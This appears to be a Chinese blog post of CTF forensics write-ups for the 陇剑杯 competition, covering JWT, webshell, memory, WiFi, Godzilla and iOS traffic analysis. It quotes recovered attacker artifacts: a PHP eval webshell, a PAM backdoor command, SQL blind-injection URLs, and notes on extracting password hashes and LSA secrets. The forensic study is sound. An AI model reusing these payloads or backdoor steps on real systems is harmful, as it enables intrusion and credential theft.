---
title: 陇剑杯部分WP
date: 2021-09-16 22:28:48
tags:  CTF,比赛
category: CTF
---



流量杯了属实是，web手初试流量分析orz，学到很多。。。

## 🔗流量分析

> [CTF流量分析题目总结](https://jwt1399.top/posts/29176.html#toc-heading-17)
>
> [CTF视角的wireshark基础](https://blkstone.github.io/2017/11/09/wireshark-basic/)

## 🔗内存取证

> ​	[总结](https://r0fus0d.blog.ffffffff0x.com/post/memory_forensics/)

## WP参考

> [魔法少女]( http://www.snowywar.top/?p=2554)
>
> [bit师傅](https://www.xl-bit.cn/index.php/archives/724/)

## 🔧工具

> [bake工具](https://chef.miaotony.xyz/)
>
> [密码爆破神器--Hashcat【kali自带】](https://www.sqlsec.com/2019/10/hashcat.html)
>
> [国外在线hash解密](https://crackstation.net/)
>
> [JWT在线加解密](https://jwt.io/)
>
> [华为手机备份文件解密](https://github.com/RealityNet/kobackupdec)





## JWT

<span style="background:#FFDBBB;">收获：jwt认证、wireshark流量分析看包</span>

### 📚准备知识

- jwt类似cookie，也是一种认证方式，是token的一种

- eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkphdmHnoo7noo7lv7UiLCJpYXQiOjE1MTYyMzkwMjJ9.LLJIkhJs6SVYlzn3n8fThQmhGutjTDI3RURTLtHV4ls

- JWT包含三个部分： Header头部，Payload负载和Signature签名。由三部分生成token，三部分之间用“.”号做分割。

- 参考

  - JWT与cookie和token的区别：https://blog.csdn.net/Cjava_math/article/details/81563871

  - 一分钟带你了解JWT认证！https://www.cnblogs.com/haha12/p/11796456.html

  - https://www.cnblogs.com/aaron911/p/11300062.html
  - JWT在线解密：https://jwt.io/

### ✍解题

- 2.1该网站使用了`___jwt___`认证方式。（如有字母请全部使用小写）

  - 下载附件，打开流量包，直接过滤http包，追踪流，看到token=eyJh...，直接锁定为jwt认证方式（题目专题也是jwt）

- 2.2黑客绕过验证使用的jwt中，id和username是`_10087#admin_`。（中间使用#号隔开，例如1#admin）

  - 看到POST，追踪http，发现token，解密得到10086#admin，不对，看响应包，说权限不够，登陆失败，继续找

    ![img](https://api2.mubu.com/v3/document_image/0df57412-e759-4e46-8ec1-a7ef38ea55f7-11812322.jpg)

  - 找post的，追踪，搜索token，找到不一样的，发现登陆成功=》10087#admin，【**注意先找大包，时间先后，post**】

    ![img](https://api2.mubu.com/v3/document_image/c49414ab-877b-41a5-a92d-b8f2ccbf18f1-11812322.jpg)

- 2.3黑客获取webshell之后，权限是`___root___`？

- 2.4黑客上传的恶意文件文件名是`__1.c__`。(请提交带有文件后缀的文件名，例如x.txt)

  - ==注意筛选post，时间先后！==然后发现echo >1.c，说明恶意代码写入了1.c

    ![img](https://api2.mubu.com/v3/document_image/f0ad57f5-27b3-40fc-bb69-3dd8b38de2bc-11812322.jpg)

- 2.5黑客在服务器上编译的恶意so文件，文件名是`__looter.so__`。(请提交带有文件后缀的文件名，例如x.so)

  - 继续看时间，post，发现移动1.c并改名了，然后117号包就编译了

    ![img](https://api2.mubu.com/v3/document_image/aede6f28-c0b0-4f2f-8c81-751e401d3506-11812322.jpg)![img](https://api2.mubu.com/v3/document_image/62f20a0c-2b92-4fae-9d91-050480cc4e4f-11812322.jpg)

  - 发现要编译的文件：looter.so

    <img src="https://api2.mubu.com/v3/document_image/1a05340b-1111-4ed9-963a-b1da33c38bc0-11812322.jpg" alt="img" style="zoom: 50%;" />

- 2.6黑客在服务器上修改了一个配置文件，文件的绝对路径为`__/etc/pam.d/common-auth__`。（请确认绝对路径后再提交）

  - 找、看post包体，command是url编码后的，找到`Form item: "command" = "echo "auth optional looter.so">>/etc/pam.d/common-auth"`，恶意文件绝对路径：`/etc/pam.d/common-auth`





## webshell

<span style="background:#FFDBBB;">收获：wireshark检索、权限怎么看、从代理工具frpc看socket5账号密码</span>

### 准备知识

- ob函数

  - [PHP详解ob_clean,ob_start和ob_get_contents函数](https://www.cnblogs.com/xuzhengzong/p/7240809.html)

  - start：开始记录要输出的东西，==并且所有输出放缓存区而不是浏览器！==

  - get_contents(); 取出从ob_start()函数开始的地方到这个函数之间所有输出的内容并连在一起

  - ⚠注意：start后，在任何时候使用echo ，输出都将被加入缓冲区中，直到程序运行结束或者使用ob_flush()来结束。然后在服务器中缓冲区的内容才会发送到浏览器，由浏览器来解析显示。

- try catch ：php异常处理

  - Exception：异常

  - 将要执行的代码放入TRY块中,如果这些代码执行过程中某一条语句发生异常,则程序直接跳转到CATCH块中,由$e收集错误信息和显示

  - 参考：[**PHP 异常处理**](https://www.runoob.com/php/php-exception.html)

- php_uname — 返回运行 PHP 的系统的有关信息

  - 参数没有或为a时默认返回全部信息即操作系统名称、主机名、版本名称、版本信息、机器类型，eg：`Linux localhost 2.4.21-0.13mdk #1 Fri Mar 14 15:08:06 EST 2003 i686`,而`echo PHP_OS`只返回Linux

- substr

  - 字符串中的第一个字符的索引为 0，第三个参数表示截取长度没有则一直到结尾

- urldecode(),解码字符串中的 %16进制【url编码就是%+16进制数】



### 解题✍

- 3.1黑客登录系统使用的密码是？

  - 搜索password，在分组详情里，找到password为Admin123!@#

- 3.2黑客修改了一个日志文件，文件的绝对路径为？。（请确认绝对路径后再提交）

  - 继续找POST，发现日志文件路径data/Runtime/Logs/Home/21_08_07.log

- 3.3黑客获取webshell之后，权限是______？

  - 继续找POST，发现317包有系统命令whoami，**回答经对比发现是在<!DOCUMENT>前default/后,权限是www-data**，【<span style="background:#FF9999;">⚠权限无非一般就是www-data,或者root</span>】

    ![img](https://api2.mubu.com/v3/document_image/fd8c652a-92b4-42d3-a258-1c829ab1f177-11812322.jpg)![img](https://api2.mubu.com/v3/document_image/47c95dc1-d440-4d68-9d7b-6b69f7a37fdd-11812322.jpg)![img](https://api2.mubu.com/v3/document_image/0959a132-4a15-4839-a182-28653be2a2de-11812322.jpg)

- 3.4黑客写入的webshell文件名是_____________。(请提交带有文件后缀的文件名，例如x.txt)

  - 发现base64的一句话木马，`<?php eval($_REQUEST[aaa]);?>`，`"aaa" = "system('echo PDxxxxxxxxxxxxx|base64 -d > /var/www/html/1.php')"`则文件名是1.php

    ![img](https://api2.mubu.com/v3/document_image/9d7dc7f0-0f95-46e8-bbfc-ad7309c1ff43-11812322.jpg)

- 3.5黑客上传的代理工具客户端名字是______frpc_______。（如有字母请全部使用小写）

  - 后分析POST包，代码审计，**substr去掉前两位**base64解密=》L3Zhci93d3cvaHRtbC9mcnBjLmluaQ== =》 /var/www/html/frpc.ini  =》==frpc：为反向代理内网穿透常用工具==，注意：之前的value`&j68071301598f=HdL3Zhci93d3cvaHRtbC8=;=>L3Zhci93d3cvaHRtbC8=   =>/var/www/html/`无效！

    - 响应包的文件信息，也可以看到代理文件=》frpc

      <img src="https://api2.mubu.com/v3/document_image/3f490319-4495-4d33-ac75-e3c9cdc8e564-11812322.jpg" alt="img" style="zoom:67%;" />

- 3.6黑客代理工具的回连服务端IP是_____192.168.239.123________。

- 3.7黑客的socks5的连接账号、密码是`__0HDFt16cLQJ#JTN276Gp___`。（中间使用#号隔开，例如admin#passwd）

  - 代理客户端ip：对上面发现设置代理ini的包下面还有一串参数，16进制转换=》代理地址为192.168.239.123，socket5账号密码：0HDFt16cLQJ#JTN276Gp

    <img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/3e3f505d-9052-43a9-8c4f-8c126076dd70-11812322.jpg" alt="img" style="zoom:50%;" />



## 日志分析

要点：<span style="background:#FFDBBB;">直接记事本打开，Ctrl+F，搜200</span>





## **内存分析** ❗

<span style="background:#FFDBBB;">收获：</span>

- volatility内存取证mimikatz爆破密码
- volatility文件扫描检索、dump文件、dump hash表、查看内存信息、注册表、直接提取LSA密码
- 华为备份文件还原

### 📚准备知识

#### volatility

- [Volatility工具指令篇：](https://blog.csdn.net/chanyi0040/article/details/100956582)

  - volatility -f Target.vmem imageinfo   --查看内存信息

  - volatility -f Target.vmem --profile=Win7SP1x64 hivelist  --查看注册表信息，如所有用户名、密码hash、病毒隐藏、恶意启动项、映射劫持。等

  - volatility -f Target.vmem --profile=Win7SP1x64 hashdump  --获取用户名及密码hash，一行一个用户  【获取特定用户hashdump -y system的偏移量 -s SAM的偏移量】

  - volatility -f Target.vmem --profile=Win7SP1x64 lsadump  --获取最后登录的用户名

-  密码爆破神器--Hashcat：https://www.sqlsec.com/2019/10/hashcat.html【kali自带】

  - -m 接hash类型，默认0：md5。-a指定爆破模式，0：字典爆破

  - `hashcat64.exe -m 0 -a 0 5ec822debe54b1935f78d9a6ab900a39 password.txt`  使用密码字典破解 MD5 哈希

- 国外在线hash解密

  - https://crackstation.net/

- 华为备份文件解密

  - https://github.com/RealityNet/kobackupdec

  - py -3 kobackupdec.py -vvv 设置的密码  “备份文件存放目录(文件夹)”  解密文件的存放目录 



### ✍解题

题目：题目描述:网管小王制作了一个虚拟机文件，让您来分析后作答：

#### vol爆破虚拟机密码

虚拟机的密码是`___flag{W31C0M3 T0 THiS 34SY F0R3NSiCX}_`。（密码中为flag{xxxx}，含有空格，提交时不要去掉）

- txt提示no space but underline，没有空格但有下划线

- 先kali对镜像文件获取信息：`vol.py -f 'Target.vmem' imageinfo`，取第一个关键文件Win7SP1x64

  ![img](https://api2.mubu.com/v3/document_image/2d2d6a13-e146-44f0-bb27-49fd9b5f7e00-11812322.jpg)

- 再用户名密码导出hash`vol.py -f 'Target.vmem' --profile=Win7SP1x64 hashdump `

  - 尝试对hash解密，发现没有结果

    ![img](https://api2.mubu.com/v3/document_image/4709cc48-538c-4e4a-b459-7d70b39c8496-11812322.jpg)

- 从注册表转储（解密）LSA 机密`vol.py -f 'Target.vmem' --profile=Win7SP1x64 lsadump `发现flag

  <img src="https://api2.mubu.com/v3/document_image/2e80b0ff-c2b1-41c2-927a-81f8a3d6de56-11812322.jpg" alt="img" style="zoom:67%;" />

- 还可以直接使用minikatz插件获取flag【安装时注意mimikatz里的模块construct版本问题，2.5.5-reupload在[这里下](https://mirrors.huaweicloud.com/repository/pypi/simple/construct/)】

  ![img](https://api2.mubu.com/v3/document_image/13ec32cf-3597-4af9-817f-85f5e7230826-11812322.jpg)



#### vol导文件+华为手机备份文件取证

虚拟机中有一个某品牌手机的备份文件，文件里的图片里的字符串为`__flag{TH4NK Y0U FOR DECRYPTING MY DATA}__`。（解题过程中需要用到上一题答案中flag{}内的内容进行处理。本题的格式也是flag{xxx}，含有空格，提交时不要去掉)

- 第二题先搜下文件，发现好多华为P40相关的文件，都取出来然后用一个华为备份还原的脚本一把梭了

- 文件扫描`vol.py -f Target.vmem --profile=Win7SP1x64 filescan `看到华为的信息，再筛选`vol.py -f Target.vmem --profile=Win7SP1x64 filescan | grep 'HUAWEI' `

  ![img](https://api2.mubu.com/v3/document_image/8d1e4b50-4ca1-4361-ad4c-af3ca70f7a73-11812322.jpg)

- ==由于华为手机助手加密的文件解密时需要依赖整个文件夹中的文件，只有一个images0.tar.enc是不行的。==

  - 在当前目录下导出tar和第一个文件`vol.py -f Target.vmem --profile=Win7SP1x64 dumpfiles -Q 0x000000007fe72430 -D ./`导出文件为.dat文件，`vol.py -f Target.vmem --profile=Win7SP1x64 dumpfiles -Q 0x000000007d8c7d10 -D ./`

    ![img](https://api2.mubu.com/v3/document_image/e6055238-6bb6-4c98-b12e-fada725a6276-11812322.jpg)![img](https://api2.mubu.com/v3/document_image/f386b2f2-bb53-4b11-978e-519a9d1287fc-11812322.jpg)

  - 打开dat文件，发现文件夹里面就是我们需要的内容

**华为备份解密器**

  - 方便起见把HUAWEI P40_2021-aa-bb xx.yy.zz更名为in，决定生成在out文件夹里（未创建）

  - `python3 kobackupdec.py -vvv W31C0M3_T0_THiS_34SY_F0R3NSiCX ./in ./out `【kali运行失败，win成功】

    ![img](https://api2.mubu.com/v3/document_image/b758ae8d-5786-4702-931b-dc1adae58061-11812322.jpg)

  - 打开out文件夹，找到图片，发现flag{TH4NK Y0U FOR DECRYPTING MY DATA}

    <img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/95adb600-2ddb-421b-b414-c180d1fc4470-11812322.jpg" alt="img" style="zoom:67%;" />





## SQL注入

记得好像是看日志

<span style="background:#FFDBBB;">要点：注意问库名表名列名时可看字段名前的一条信息，直接一条全弄出来sqli#flag#flag，字段值才需要一个一个字母看
</span>
<span style="background:#FFDBBB;">
</span>

```
172.17.0.1 - - [01/Sep/2021:01:45:55 +0000] "GET /index.php?id=1%20and%20if(substr((select%20flag%20from%20sqli.flag),2,1)%20=%20'r',1,(select%20table_name%20from%20information_schema.tables)) HTTP/1.1" 200 424 "-" "python-requests/2.26.0"
```



## **wifi** ❗

**<span style="background:#FFDBBB;">收获：</span>**

- 网卡的GUID与interface
- vol imageinfo+cmdscan+filescan+dumpfile
- wifi密码airdecap-ng破解
- wireshark客户端服务端哥斯拉流量分析+解密应答包

![image-20211209190857123](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20211209190857123.png)

### 📚准备知识

#### GUID

- 什么是 GUID？又叫uuid（通用标识符）

  - 全球唯一标识符 (GUID) 是一个字母数字标识符，用于指示产品的唯一性安装。在许多流行软件应用程序（例如 Web 浏览器和媒体播放器）中，都使用 GUID。

  - ==GUID 的格式为“xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx”==，其中每个 x 是 0-9 或 a-f 范围内的一个十六进制的数字。例如：6F9619FF-8B86-D011-B42D-00C04FC964FF 即为有效的 GUID 值

  - {CAF53C68-A94C-11D2-BB4A-00C04FA330A6}

- 为什么要用GUID？

  - 世界上的任何两台计算机都不会生成重复的 GUID 值。GUID 主要用于在拥有多个节点、多台计算机的网络或系统中，分配必须具有唯一性的标识符。在 Windows 平台上，GUID 应用非常广泛：注册表、类及接口标识、数据库、甚至自动生成的机器名、目录名等。

#### kali，vol内存取证

- 参考：

  - [http://www.atkx.top/2021/06/03/Volatility%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/](http://www.atkx.top/2021/06/03/Volatility内存取证/)

  - https://cjjkkk.github.io/Volatility-WindowsMemoryForensicsAnalysis/

- `python vol.py -f [image] ‐-profile=[profile][plugin]   `其中 -f 后面加的是要取证的文件， --profile 后加的是工具识别出的系统版本， [plugin] 是指使用的插件，其中默认存在一些插件，另外还可以自己下载一些插件扩充。<span style="background:#bbffff;">常见的内存镜像文件有raw、vmem、dmp、img等</span>

- `vol.py -f <镜像文件> --profile=[profile文件] filescan | grep flag` 扫描所有的文件搜索flag

- imageinfo后一般情况下第一个就是对的:如：Win7SP1x64

#### WIFI密码

- <span style="background:#bbffff;">关于系统保存的wifi密码文件地址</span>:如果是Windows Vista或Windows 7，保存在`c:\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces\[网卡Guid]`，每个无线网络对应一个XML文档

- <span style="background:#FF9999;">**有密码的流量包如何解密wifi？**</span>

  - wireshark：成功拿到wifi密码和ssid，233@114514_qwe   My_Wifi，那就可以尝试解密wifi流量包了。**设置方法：编辑-首选项-Protocols-IEEE 802.11-Edit**,设置好后点击ok，就可以看到解密的流量包了

  - 或者airdecap-ng工具

##### airdecap-ng

- 用于解开加密的WiFi流量包 ，需要知道ssid和pass【SSID（路由器发送的无线信号的名字）】
- `airdecap-ng -e <Kevin’sWi-FI essid> -p <passwd.txt> 目标.cap`
- [衍生：三分钟，快速入狱教程，之如何迅速破解WiFi密码](https://www.bilibili.com/read/cv9131435)  、 [2](https://www.cnblogs.com/lsdb/p/10075508.html)



#### 压缩函数

[PHP 字符串各种压缩函数，， gzencode 和 gzdecode](http://m.w3capi.com/m_doc/chapter/id/105/cid/21.html#sub-198)

- `gzencode ( string $data [, int $level = -1 [, int $encoding_mode = FORCE_GZIP ]] ) : string  `，第二个参数是压缩等级，第三个是编码模式



#### 哥斯拉木马❗

- 🔗参考：

  > [涉及哥斯拉3个包分析](https://www.geekby.site/2021/03/webshell流量分析/)
  >
  > [【原创】哥斯拉Godzilla加密流量分析 - FreeBuf网络安全行业 ](https://www.freebuf.com/sectool/285693.html)

- 是与蚁剑、菜刀、冰蝎类似的webshell管理工具，但它流量加密更强大，**可能菜刀、蚁剑、冰蝎的马刚连上就断，最后只有哥斯拉可以正常连接**

  - 密码是后门的参数，pass=xxxxx，这种。密钥：key，用于对请求数据进行加密，不过加密过程中并非直接使用密钥明文，而是计算密钥的md5值，然后**取其前16位**用于加密过程，🐖<span style="background:#FF9999;">！密钥与密码不同！</span>

  - 哥斯拉测试连接，客户端会传三个POST包，wireshark服务器收到三个包的流量

    - 第1个请求会发送**大量数据**，该请求不含有任何Cookie信息，服务器**响应报文不含任何数据**，但是会设置PHPSESSID，后续客户端请求都会自动带上该Cookie

      - 哥斯拉发送的第一个POST请求中，请求数据的**加密过程为**：将原始数据与shell密钥（本例中为test1234）md5值的前16位（本例中为16d7a4fca7442dda）按位异或，再依次经过base64编码和URL编码，得到编码数据，最终以pass=编码数据的形式作为POST报文请求体，POST到服务器。

      - 解密过程与加密过程正好相反：从pass=编码数据中提取编码数据，依次经过URL解码和base64解码，再与shell密钥（本例中为test1234）md5值的前16位（本例中为16d7a4fca7442dda）按位异或即可得到原始请求数据。

    - 第2个请求与第三个请求一样，已经自动带上了第1个请求中服务器响应返回的Cookie值，body只有少量的数据。
      - 哥斯发送的第2个POST请求实际上是通过调用函数向服务器POST了原始数据的加密包，如果服务器返回值（解密后）为ok，则说明shell测试连接成功。

- ==shell代码【加解密、流量分析】==

  ![image-20211209192147189](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20211209192147189.png)

  - 其中比较核心的地方有两处，第一处是进行异或加密和解密的函数encode，第二处是嵌套的两个if对哥斯拉客户端上传的代码做执行并得到结果。根据`$data=encode(base64_decode($_POST[$pass]),$key);`

  - 为了使客户端分离出结果，三个echo利用md5值作为分离标志，将得到的代码执行结果进行拼接：

    - md5($P.$T)前16位

    - 结果 -> E函数进行异或加密 -> Base64编码

    - md5($P.$T)后16位

    - ==🐖！：哥斯拉输出结果（密文）是会将结果压缩然后加密  =》gzencode =>gzdecode==

  - ==！则对客户端收到的包解密：去掉body首位16位=》base64解密=》encode，而新版的哥斯拉对流量包压缩了，因此最后还要加上解压函数=》gzdecode==
    - **即要想解密服务器响应数据，需要去除混淆字符，进行base64解密，再异或，再进行gzip解密。**



### ✍解题

WP

> - https://www.nctry.com/2449.html
> - 微信公众号（黑白天实验室）：http://cn-sec.com/archives/547840.html
> - 魔法少女：http://www.snowywar.top/?p=2554



题目

- 网管小王最近喜欢上了ctf网络安全竞赛，他使用“哥斯拉”木马来玩玩upload-labs，并且**保存了内存镜像、wifi流量和服务器流量**，让您来分析后作答：（本题仅1小问）

- 小王往upload-labs上传木马后进行了`cat/flag`, flag内容为`____flag{5db5b7b0bb74babb66e1522f3a6b1b12}___`(压缩包里有解压密码的提示，需要额外添加花括号)



#### 1.取证**【镜像里面有什么内容（目的是破解客户端的流量）】**

- vol.py -f Windows 7-dde00fa9.vmem  imageinfo ，查看镜像文件

  ![img](https://api2.mubu.com/v3/document_image/0f6e9772-460c-48ce-8009-38a92e865c81-11812322.jpg)

- `vol.py -f Windows 7-dde00fa9.vmem  --profile=Win7SP1x86_23418 cmdscan`，搜索四个文件的cmd进程，发现一样的，就按第一个弄，发现cmd里有导出文件的痕迹【后续知道imageinfo后一般情况下第一个就是对的:Win7SP1x64】

  ![img](https://api2.mubu.com/v3/document_image/bbaa366e-6ea4-42c7-8098-e709040aec1c-11812322.jpg)

- `vol.py -f Windows 7-dde00fa9.vmem  --profile=Win7SP1x86_23418 filescan |grep -E "rar|zip"`，搜索所有文件，找含zip|rar的，发现可疑文件MY_WIFI.zip，dump下来

  ![img](https://api2.mubu.com/v3/document_image/08f041bc-5517-4592-96a5-76ee5188ee68-11812322.jpg)

- `vol.py -f Windows 7-dde00fa9.vmem  --profile=Win7SP1x86_23418 dumpfiles -Q 0x000000003e4b2070 -D ./`【-Q是偏移量，-D是导出的文件夹，./意思是导出在当前文件夹、Q在信息的最左边一串数字 】

  ![img](https://api2.mubu.com/v3/document_image/8e0303de-749b-4a59-9cb0-f906148b614f-11812322.jpg)

- 导出文件为.dat文件，打开发现为加密的xml,🐖==！【密码在描述里，kali下压缩没有描述，所放到win环境里看！注释的描述信息有东西哇，发现密码在网卡的GUID里。==】（password is Network Adapter GUID）

  ![img](https://api2.mubu.com/v3/document_image/442e8739-b6af-4ffc-af65-b4458a9cc8b5-11812322.jpg)

- <span style="background:#FF9999;">网工人都知道网卡的GUID和接口绑定，上面那位师傅直接grep { 了。我就一条命令完事，直接查接口！</span>

  - `vol.py -f 'Windows 7-dde00fa9.vmem' --profile=Win7SP1x86_23418 filescan | grep "Interfaces"`找到guid密码

    ![img](https://api2.mubu.com/v3/document_image/341de8d4-0eb9-4492-818c-9f134562c5cd-11812322.jpg)

  - 也可以按花括号搜索`vol.py -f 'Windows 7-dde00fa9.vmem' --profile=Win7SP1x86_23418 filescan | grep "{"`，结果很多！不如找接口

- 解压出来是xml文件，AES、passPhrase、 密码233@114514_qwe，应该是某个加密文件的密码，题目里也只剩下一个东西被加密了，那就是客户端pcap了。

  ![img](https://api2.mubu.com/v3/document_image/c1ec4a75-4924-47e1-af97-1ae5462ae181-11812322.jpg)

- 分析客户端wifi，发现只有一个wifi，对流量进行解密

  ![img](https://api2.mubu.com/v3/document_image/e674d2c4-436a-4e83-b235-010724a23fa4-11812322.jpg)

- 用kali自带WiFi工具解密` airdecap-ng -e My_Wifi -p 233@114514_qwe  客户端.cap ` -e 指定目标网络ssid，-p 密码，ssid在pacp里，解码后有新的东西出现，对cap包流量分析

  ![image-20211209193107506](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20211209193107506.png)

  - <span style="background:#bbffff;">也可用wireshark自带工具解密，设置方法：编辑-首选项-Protocols-IEEE 802.11-Edit,</span>设置好后点击ok就可以看到解密的流量包了

    ![img](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/5da66504-a615-4db3-97fe-ea4cd042357b-11812322.jpg)



#### 2.流量分析+哥斯拉解码

已知小王往 upload-labs 上传木马后进行了 cat /flag，小王在根目录下读取了flag，那么这个flag应该在发出请求后哥斯拉响应的数据中【解密后的客户端】。

- 现在是需要在客户端获取服务器响应的数据：

- 同样是http协议，过滤下，多跟踪几个数据，进行解密。

- 尝试解密了几个都发现不是flag，发现某个http流，最终成功复现出flag



1. 分析服务器端，过滤http，发现post上传1.php，分析几个post包，追踪，发现有三个小包（==哥斯拉三次流量==，后两包bodybake后都是webshell加密代码，第一个包pass也是，key利用下面的重要函数反解得到包含run、bypass_open_basedir、formatParameter、evalFunc等二十多个功能函数，具备代码执行、文件操作、数据库操作等诸多功能）

- 🐖==！：得到加密重要函数，这一看就是哥斯拉的马，并且使用了xor_base64的加密器，配置也是默认配置==，密码:pass 密钥:key,也拿到了服务器ip:42.192.84.152 ,所以我们返回到wifi流量包，直接筛选服务器ip的包，找到几个哥斯拉加密的返回包进行解密流量

  ![img](https://api2.mubu.com/v3/document_image/e3ed2a28-8417-464a-97fb-3a13f1956ebe-11812322.jpg)

- 解密包的代码：（加解密函数因为异或的原因，都是encode），马里的重要函数`encode(base64_decode($_POST[$pass]),$key);`=》**数据在接收时，<span style="background:#FF9999;">除了采用前 16 位和后 16 为的干扰字符外</span>，内容采用 gzip 压缩编码 + 异或 + base64** =》编写解密代码【<span style="background:#FF9999;">注意要先删除前16位和后16位字符再执行代码</span>】

  ![img](https://api2.mubu.com/v3/document_image/9b421c10-5f30-48d7-a86b-15be843cd20d-11812322.jpg)

- 对解密后的客户端过滤http，发现无get/post，分析最后一个http回显（或者可疑的200包，只有一行txt/html返回值的）原始数据包返回`72a9c691ccdaab98fL1tMGI4YTljMn75e3jOBS5/V31Qd1NxKQMCe3h4KwFQfVAEVworCi0FfgB+BlWZhjRlQuTIIB5jMTU=b4c4e1f6ddd2a488`==去掉前面的16位和后面的16位== （代码审计）得到`fL1tMGI4YTljMn75e3jOBS5/V31Qd1NxKQMCe3h4KwFQfVAEVworCi0FfgB+BlWZhjRlQuTIIB5jMTU=`，放到前面的解密代码在线php解密，得到flag`flag{5db5b7b0bb74babb66e1522f3a6b1b12}`

  ![image-20211209193723030](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20211209193723030.png)

  - （也可这样：最后解哥斯拉的方法，其他师傅他们是直接用放进哥斯拉里面，然后让哥斯拉帮忙解码，看到flag的）



## ios

<span style="background:#FFDBBB;">收获：wireshark检索特定内容 + TLS流量包解密 + 查看端口扫描、导出分组详情</span>



### 📚准备知识

> - 【[TLS/SSL阮一峰详解原理](https://webcache.googleusercontent.com/search?q=cache:8RUq5kprt08J:https://www.ruanyifeng.com/blog/2014/02/ssl_tls.html+&cd=6&hl=zh-CN&ct=clnk&gl=us)】
> - [详细：wireshark解密tls，CSDN](https://blog.csdn.net/walleva96/article/details/106844033)
> - [使用wireshark分析TLS](https://www.cnblogs.com/lv6965/p/7859925.html)
> - [思否：，图文详解，如何用 wireshark 抓包 TLS 封包](https://segmentfault.com/a/1190000018746027)



### ✍解题

 Ios题目描述：一位ios的安全研究员在家中使用手机联网被黑，不仅被窃密还丢失比特币若干，请你通过流量和日志分析后作答

- 10.1黑客所控制的C&C服务器IP是______3.128.156.159_______。

  -  筛选http contains "github"，追踪具体的tcp流，可以发现这⾥有转发操作

    ![img](https://api2.mubu.com/v3/document_image/ddf57b05-2f8f-406c-b568-da87be40f707-11812322.jpg)

- 10.2黑客利用的Github开源项目的名字是__Stowaway____。（如有字母请全部使用小写）

  - 同上一题的包

- 10.3通讯加密密钥的明文是____hack4sec________。

  - 打开上边那个工具的主页，看下readme，发现-s后跟的就是密钥



#### TLS流量包解密

10.4黑客通过SQL盲注拿到了一个敏感数据，内容是______746558f3-c841-456b-85d7-d6c0f2edabb2______。

- **部分存在TLS加密的流量需要用到秘钥进行解密**  ，【<span style="background:#FF9999;">而例如chrome，firefox， curl 等应用， 当设置了SSLKEYLOGFILE的环境变量， 就能够获取到每次对话产生的key log文件。**利用每次对话中，存储下来的key log来解密报文**是一种非常普遍的手段</span>】

- key.txt中的**“Master-Key”为主密钥，主密钥并不是最终加解密使用的密钥**，会话密钥是通过主密钥再进一步计算获得。

- 编辑->首选项->protocols->TLS导入文件，要导入https证书了，(把key.log中rsa session都去了只留CLIENT_RANDOM文件然后导入tls文件)【可去可不去】，

  ![img](https://api2.mubu.com/v3/document_image/203c83ea-0460-4652-838a-6d3c9658a7f6-11812322.jpg)

- 发现新出现的http2有注入的内容，然后筛一下http2流（`ip.dst == 192.168.1.12 &&http2`），到处文件可以看到sql盲注的内容，然后就导出分组解析结果->csv->改后缀为txt->导入bake url解码->导出文件，挨个数或者写脚本看下盲注的内容。【ctrl f password,4,第一个前面就是猜对的字母】

  ![img](https://api2.mubu.com/v3/document_image/e3a4ae51-28eb-4815-b18e-338f29d16c5a-11812322.jpg)<img src="https://api2.mubu.com/v3/document_image/64da732b-43bb-4499-a7c0-99ad0b13d44f-11812322.jpg" alt="img" style="zoom:50%;" />



10.5黑客端口扫描的扫描器的扫描范围是_____10-499_______。（格式使用“开始端口-结束端口”，例如1-65535）

- \1. 在Wireshark中，直接观察数据包：显示目标地址的端口号：打开编辑->首选项设置->列->按“添加”按钮->在字段类型中选择`Dest port(unresolved)`即可。发现连续端口扫描是10-499

- \2. 师傅们的wp：也可在linux用代码`$ tcpdump -n -r triffic.pcap  | awk '{print $2$3}' | sort -u > su.txt  `将数据流dump出来，观察被扫描的端口位置，从10开始到499`reading from file triffic.pcap, link-type EN10MB (Ethernet)`

  <img src="https://api2.mubu.com/v3/document_image/1c4cc9bc-d569-408e-8e62-83323c05898f-11812322.jpg" alt="img" style="zoom:50%;" />

10.6被害者手机上被拿走了的私钥文件内容是____________。

10.7黑客访问/攻击了内网的几个服务器，IP地址为`_____172.28.0.2#192.168.1.12_______`。（多个IP之间按从小到大排序，使用#来分隔，例如127.0.0.1#192.168.0.1)

- wireshark里被扫描的192.168.1.12和access.log里被写后门的172.28.0.2

10.8黑客写入了一个webshell，其密码为`____fxxk________`。

```
"GET /favicon.ico HTTP/1.1" 200 43 "http://172.28.0.2//ma.php?fxxk=system(base64_decode(%27d2hvYW1p%27));" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36" "-"
```

密码为fxxk